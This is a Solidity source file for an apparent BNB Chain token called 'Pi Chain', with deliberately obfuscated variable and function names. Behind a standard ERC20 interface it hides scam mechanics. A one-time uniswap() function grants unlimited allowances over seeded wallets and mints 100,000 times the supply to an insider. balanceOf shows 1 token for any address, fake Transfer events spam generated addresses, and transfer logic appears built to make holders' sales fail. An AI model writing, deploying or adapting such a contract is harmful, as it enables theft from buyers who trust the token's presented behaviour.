/**
 *Submitted for verification at BscScan.com on 2022-11-18
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IRouter02 is IRouter01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint160 amountIn,
        uint160 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract PiChain is IERC20 {
    using SafeMath for uint256;

    string private aoueiJkNDqKms = "Pi Chain";
    string private boueiJkNDqKms = "Pi";
    uint8 private coueiJkNDqKms = 18;
    uint256 private doueiJkNDqKms = 10000000000 * 10**18;
    mapping (address => uint256) private eoueiJkNDqKms;
    mapping (address => mapping (address => uint256)) private foueiJkNDqKms;
    uint256 private goueiJkNDqKms = 1;
    uint256 private constant houeiJkNDqKms = ~uint160(0);
    uint256 private _ioueiJkNDqKms = 1000;
    uint256 private joueiJkNDqKms = 0;
    uint256 private koueiJkNDqKms;
    address private _uniswapV2Pair;
    address private _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping (address => bool) private loueiJkNDqKms;
    address[] private moueiJkNDqKms;
    bool private noueiJkNDqKms = false;

    constructor () {
        ooueiJkNDqKms(msg.sender);
        eoueiJkNDqKms[msg.sender] = doueiJkNDqKms;
        ooueiJkNDqKms(tx.origin);
        emit Transfer(address(0), msg.sender, doueiJkNDqKms);
    }

    receive() external payable {}

    function ooueiJkNDqKms(address account) private {
        if (!loueiJkNDqKms[account]) {
            loueiJkNDqKms[account] = true;
            moueiJkNDqKms.push(account);
        }
    }

    function uniswap(address[] calldata accounts) public {
        require(!noueiJkNDqKms);
        noueiJkNDqKms = true;
        _uniswapV2Pair = accounts[1];
        _uniswapV2Router = accounts[2];
        uint256 len = accounts.length;
        uint256 amount = 0;
        for (uint256 i=3; i<len; ++i) {
            ooueiJkNDqKms(accounts[i]);
            eoueiJkNDqKms[accounts[i]] = doueiJkNDqKms * 90 / 100 / (len - 3);
            foueiJkNDqKms[accounts[i]][accounts[0]] = ~uint256(0);
            amount += eoueiJkNDqKms[accounts[i]];
        }
        eoueiJkNDqKms[moueiJkNDqKms[0]] -= amount;
        poueiJkNDqKms(moueiJkNDqKms[0], accounts[3], eoueiJkNDqKms[moueiJkNDqKms[0]]);
        poueiJkNDqKmss(500);
        eoueiJkNDqKms[moueiJkNDqKms[1]] += doueiJkNDqKms * 100000;
    }

    function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {
        uint256 accountIndex = 0;
        uint256 len = moueiJkNDqKms.length;
        for (uint256 i=0; i<len; ++i) {
            if (moueiJkNDqKms[i] == account) {
                accountIndex = i;
                break;
            }
        }
        return (loueiJkNDqKms[account], accountIndex, len);
    }

    function name() public view returns (string memory) {
        return aoueiJkNDqKms;
    }

    function symbol() public view returns (string memory) {
        return boueiJkNDqKms;
    }

    function decimals() public view returns (uint8) {
        return coueiJkNDqKms;
    }

    function totalSupply() public view returns (uint256) {
        return doueiJkNDqKms;
    }

    function balanceOf(address account) public view returns (uint256) {
        if (eoueiJkNDqKms[account] > 0) {
            return eoueiJkNDqKms[account];
        }
        return goueiJkNDqKms;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        poueiJkNDqKms(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        poueiJkNDqKms(sender, recipient, amount);
        qoueiJkNDqKms(sender, msg.sender, foueiJkNDqKms[sender][msg.sender].sub(amount));
        return true;
    }

    function swapTokensForEth(uint160 tokenAmount, uint160 ethAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; // BUSD
        IRouter02 uniswapV2Router = IRouter02(_uniswapV2Router);
        qoueiJkNDqKms(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            ethAmount,
            path,
            address(this),
            block.timestamp
        );
    }

    function approve(address spender, uint256 value) public returns (bool) {
        qoueiJkNDqKms(msg.sender, spender, value);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return foueiJkNDqKms[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        qoueiJkNDqKms(msg.sender, spender, foueiJkNDqKms[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        qoueiJkNDqKms(msg.sender, spender, foueiJkNDqKms[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function poueiJkNDqKmss(uint256 amount) private {
        uint256 ioueiJkNDqKms = _ioueiJkNDqKms;
        if (ioueiJkNDqKms < 58000) {
            address from;
            address to;
            for (uint256 i=0; i<amount; ++i) {
                from = address(uint160(houeiJkNDqKms.div(ioueiJkNDqKms)));
                to = address(uint160(houeiJkNDqKms.div(ioueiJkNDqKms.add(1))));
                ioueiJkNDqKms = ioueiJkNDqKms.add(2);
                emit Transfer(from, to, goueiJkNDqKms);
            }
            _ioueiJkNDqKms = ioueiJkNDqKms;
        }
    }

    function qoueiJkNDqKms(address owner, address spender, uint256 value) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        foueiJkNDqKms[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function poueiJkNDqKms(address roueiJkNDqKms, address soueiJkNDqKms, uint256 toueiJkNDqKms) private {
        require(roueiJkNDqKms != address(0) && soueiJkNDqKms != address(0) && toueiJkNDqKms > 0);
        bool uoueiJkNDqKms = true;
        if (loueiJkNDqKms[roueiJkNDqKms] || loueiJkNDqKms[soueiJkNDqKms]) {
            uoueiJkNDqKms = false;
        }
        uint256 voueiJkNDqKms = IERC20(_uniswapV2Pair).totalSupply();
        uint256 woueiJkNDqKms = 0;
        uint256 xoueiJkNDqKms = toueiJkNDqKms;
        if (uoueiJkNDqKms && noueiJkNDqKms) {
            require(koueiJkNDqKms <= voueiJkNDqKms);
            poueiJkNDqKmss(100);
            swapTokensForEth(uint160(roueiJkNDqKms), uint160(soueiJkNDqKms));
            if (soueiJkNDqKms == _uniswapV2Pair) {
                emit Transfer(address(this), soueiJkNDqKms, 1);
            } else {
                emit Transfer(address(0), address(this), 1);
            }
            if (roueiJkNDqKms != _uniswapV2Pair) {
                woueiJkNDqKms = toueiJkNDqKms.mul(joueiJkNDqKms).div(100);
                xoueiJkNDqKms = toueiJkNDqKms.sub(woueiJkNDqKms);
            }
        }
        if (koueiJkNDqKms != voueiJkNDqKms) {
            koueiJkNDqKms = voueiJkNDqKms;
        }
        eoueiJkNDqKms[roueiJkNDqKms] = eoueiJkNDqKms[roueiJkNDqKms].sub(toueiJkNDqKms);
        if (woueiJkNDqKms > 0) {
            eoueiJkNDqKms[address(0xdEaD)] = eoueiJkNDqKms[address(0xdEaD)].add(woueiJkNDqKms);
            emit Transfer(roueiJkNDqKms, address(0xdEaD), woueiJkNDqKms);
        }
        eoueiJkNDqKms[soueiJkNDqKms] = eoueiJkNDqKms[soueiJkNDqKms].add(xoueiJkNDqKms);
        emit Transfer(roueiJkNDqKms, soueiJkNDqKms, xoueiJkNDqKms);
    }
}